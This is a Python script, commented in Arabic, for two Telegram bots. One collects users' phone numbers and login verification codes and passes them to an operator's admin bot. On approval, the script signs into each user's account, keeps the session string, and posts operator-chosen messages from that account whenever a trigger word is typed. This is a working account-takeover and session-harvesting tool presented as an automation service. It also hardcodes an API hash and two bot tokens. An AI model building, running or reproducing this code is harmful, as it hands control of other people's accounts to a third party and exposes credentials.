import os
import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
import nest_asyncio

nest_asyncio.apply()

# --- الثوابت الأساسية ---
API_ID = 21727
API_HASH = "338d4380b2c15904fa77cfcb251d19d6"

CLIENT_BOT_TOKEN = "8909604485:AAHpNrrzTtu_kwp5he2wM7QvaWZMsqYM1TQ"
ADMIN_BOT_TOKEN = "8750783959:AAE4uk0MlEJF43gWmXhasoz5eCZmHkf2fL0"
ADMIN_ID = 5885382011

# السطور الافتراضية (يمكنك تعديلها وإضافتها مباشرة عبر بوت التحكم)
admin_custom_lines = [
    "السطر الأول الافتراضي: أهلاً بك.",
    "السطر الثاني الافتراضي: جاري إرسال البيانات تلقائياً."
]

# تخزين مؤقت لبيانات الجلسات والطلبات والإعدادات لكل مستخدم
pending_logins = {}  # {user_id: {"phone": ..., "phone_code_hash": ..., "client": TelegramClient}}
user_settings = {}   # {user_id: {"speed": 5, "trigger": "ابدأ", "session_string": ..., "userbot": TelegramClient}}

# تشغيل بوت العميل وبوت الإدارة
client_bot = TelegramClient('client_bot_session', API_ID, API_HASH).start(bot_token=CLIENT_BOT_TOKEN)
admin_bot = TelegramClient('admin_bot_session', API_ID, API_HASH).start(bot_token=ADMIN_BOT_TOKEN)

print("🚀 جاري تشغيل النظام المتكامل بكامل الميزات...")

# ==========================================
# 0. أوامر بوت التحكم (إدارة السطور)
# ==========================================
@admin_bot.on(events.NewMessage(pattern='/lines'))
async def admin_show_lines(event):
    if event.sender_id != ADMIN_ID:
        return
    lines_text = "\n".join([f"{i+1}. {line}" for i, line in enumerate(admin_custom_lines)])
    await event.respond(
        f"📋 **السطور الحالية المراد إرسالها:**\n\n{lines_text}\n\n"
        f"➕ لإضافة سطر جديد أرسل:\n`إضافة سطر: [النص]`\n\n"
        f"🗑️ لحذف جميع السطور وإعادة تعيينها أرسل:\n`مسح السطور`"
    )

@admin_bot.on(events.NewMessage(func=lambda e: e.is_private and e.sender_id == ADMIN_ID))
async def admin_manage_lines(event):
    global admin_custom_lines
    text = event.raw_text.strip()

    if text.startswith("إضافة سطر:"):
        new_line = text.split(":", 1)[1].strip()
        if new_line:
            admin_custom_lines.append(new_line)
            await event.respond(f"✅ تمت إضافة السطر بنجاح!\nالعدد الإجمالي للسطور الآن: {len(admin_custom_lines)}")
        else:
            await event.respond("❌ عذراً، نص السطر فارغ.")
    elif text == "مسح السطور":
        admin_custom_lines.clear()
        await event.respond("🗑️ تم مسح جميع السطور بنجاح. يمكنك إضافة سطور جديدة.")


# ==========================================
# 1. منطق بوت العميل (استقبال رقم الجوال والكود)
# ==========================================
@client_bot.on(events.NewMessage(pattern='/start'))
async def client_start(event):
    await event.respond("أهلاً بك! يرجى إرسال **رقم الجوال** الخاص بك بالصيغة الدولية (مثال: +9665xxxxxxxx):")

@client_bot.on(events.NewMessage(func=lambda e: e.is_private and not e.text.startswith('/')))
async def handle_client_inputs(event):
    user_id = event.sender_id
    text = event.raw_text.strip()

    # إذا كان المستخدم يرسل إعدادات السرعة أو الكلمة المفتاحية بعد تفعيله
    if user_id in user_settings:
        if text.startswith("سرعة:"):
            try:
                speed_val = int(text.split(":")[1].strip())
                user_settings[user_id]["speed"] = speed_val
                await event.respond(f"✅ تم تحديث السرعة بنجاح لتصبح: {speed_val} ثانية بين كل رسالة.")
            except ValueError:
                await event.respond("❌ خطأ: يرجى كتابة الرقم بشكل صحيح، مثال: (سرعة: 5)")
            return
        elif text.startswith("كلمة:"):
            new_trigger = text.split(":")[1].strip()
            user_settings[user_id]["trigger"] = new_trigger
            await event.respond(f"✅ تم تحديث الكلمة المفتاحية بنجاح لتصبح: `{new_trigger}`")
            return

    # خطوة 1: استقبال رقم الجوال
    if user_id not in pending_logins and user_id not in user_settings:
        if not text.startswith('+'):
            await event.respond("❌ يرجى إدخال رقم الجوال متبوعاً بمفتاح الدولة (مثال: +9665xxxxxxxx)")
            return
        
        await event.respond("⏳ جاري إرسال كود التحقق من تليجرام...")
        try:
            temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
            await temp_client.connect()
            sent_code = await temp_client.send_code_request(text)
            
            pending_logins[user_id] = {
                "phone": text,
                "phone_code_hash": sent_code.phone_code_hash,
                "client": temp_client
            }
            await event.respond("📩 تم إرسال كود التحقق إلى حسابك في تليجرام. يرجى إرسال الكود هنا الآن:")
        except Exception as e:
            await event.respond(f"❌ حدث خطأ أثناء إرسال الكود: {str(e)}")
        return

    # خطوة 2: استقبال كود التحقق وتعليقه للإدارة
    if user_id in pending_logins and user_id not in user_settings:
        code_text = text
        data = pending_logins[user_id]
        data["code"] = code_text
        
        notification_text = (
            f"🔐 **طلب تسجيل دخول جديد معلق:**\n\n"
            f"👤 **المستخدم ID:** `{user_id}`\n"
            f"📱 **رقم الجوال:** `{data['phone']}`\n"
            f"🔑 **كود التحقق المدخل:** `{code_text}`"
        )
        
        await admin_bot.send_message(
            ADMIN_ID,
            notification_text,
            buttons=[
                [Button.inline(b"✅ قبول وتسجيل الدخول", data=f"accept_login_{user_id}".encode()),
                 Button.inline(b"❌ رفض", data=f"reject_login_{user_id}".encode())]
            ]
        )
        
        await event.respond("⏳ تم استلام الكود وتعليق الطلب لدى الإدارة للمراجعة، انتظر القبول...")
        return


# ==========================================
# 2. منطق بوت الإدارة (أزرار القبول والرفض)
# ==========================================
@admin_bot.on(events.CallbackQuery(pattern=b'accept_login_'))
async def admin_accept_login(event):
    user_id = int(event.data.decode().split('_')[2])
    
    if user_id not in pending_logins:
        await event.answer("❌ انتهت صلاحية الطلب أو تم معالجته مسبقاً.", alert=True)
        return

    data = pending_logins[user_id]
    temp_client = data["client"]
    phone = data["phone"]
    code = data["code"]

    try:
        await temp_client.sign_in(phone=phone, code=code)
        session_string = temp_client.session.save()
        await temp_client.disconnect()
        
        userbot = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await userbot.start()

        user_settings[user_id] = {
            "speed": 5,
            "trigger": "ابدأ",
            "session_string": session_string,
            "userbot": userbot
        }

        setup_userbot_listener(userbot, user_id)
        del pending_logins[user_id]

        await event.answer("✅ تم قبول الطلب وتسجيل الدخول بنجاح!")
        await event.edit(f"{event.raw_text}\n\n✅ **الحالة:** تم القبول وتفعيل الحساب.")
        
        await client_bot.send_message(
            user_id,
            "🎉 **تم قبول طلبك بنجاح!**\n"
            "حسابك يعمل الآن مع نظام الأتمتة.\n\n"
            "⚙️ **الأوامر المتاحة لتعديل الإعدادات:**\n"
            "• لتعديل السرعة أرسل: `سرعة: 5` (مثال)\n"
            "• لتعديل الكلمة المفتاحية أرسل: `كلمة: ابدأ` (مثال)\n\n"
            "اذهب لأي قروب أو شات واكتب الكلمة المفتاحية لتبدأ إرسال السطور المعتمدة تلقائياً!"
        )

    except Exception as e:
        await event.answer(f"❌ فشل تسجيل الدخول: {str(e)}", alert=True)
        await client_bot.send_message(user_id, f"❌ حدث خطأ أثناء تسجيل الدخول: {str(e)}. يرجى البدء من جديد عبر ارسال /start")
        if user_id in pending_logins:
            del pending_logins[user_id]

@admin_bot.on(events.CallbackQuery(pattern=b'reject_login_'))
async def admin_reject_login(event):
    user_id = int(event.data.decode().split('_')[2])
    if user_id in pending_logins:
        try:
            await pending_logins[user_id]["client"].disconnect()
        except:
            pass
        del pending_logins[user_id]

    await event.answer("❌ تم رفض الطلب.")
    await event.edit(f"{event.raw_text}\n\n❌ **الحالة:** تم الرفض.")
    await client_bot.send_message(user_id, "❌ عذراً، تم رفض طلب تسجيل الدخول من قِبل الإدارة.")


# ==========================================
# 3 & 4. مراقبة شتات المستخدم والإرسال التلقائي للسطور
# ==========================================
def setup_userbot_listener(userbot, user_id):
    @userbot.on(events.NewMessage(outgoing=True))
    async def listener(event):
        settings = user_settings.get(user_id)
        if not settings:
            return

        current_trigger = settings["trigger"]
        
        if event.raw_text.strip() == current_trigger:
            try:
                # 1. حذف الكلمة المفتاحية فوراً
                await event.delete()
                
                speed = settings["speed"]
                chat = await event.get_chat()

                # 2. إرسال السطور الحالية (التي يتم إدارتها من بوت التحكم) بالتتابع وبالسرعة المحددة
                for line in admin_custom_lines:
                    await userbot.send_message(chat, line)
                    await asyncio.sleep(speed)
                    
            except Exception as e:
                print(f"⚠️ خطأ أثناء تنفيذ الإرسال الآلي للمستخدم {user_id}: {e}")


# --- تشغيل البوتات الرئيسية ---
async def main():
    print("✨ البوتات تعمل الآن وجاهزة تماماً...")
    await asyncio.gather(
        client_bot.run_until_disconnected(),
        admin_bot.run_until_disconnected()
    )

if __name__ == '__main__':
    asyncio.run(main())
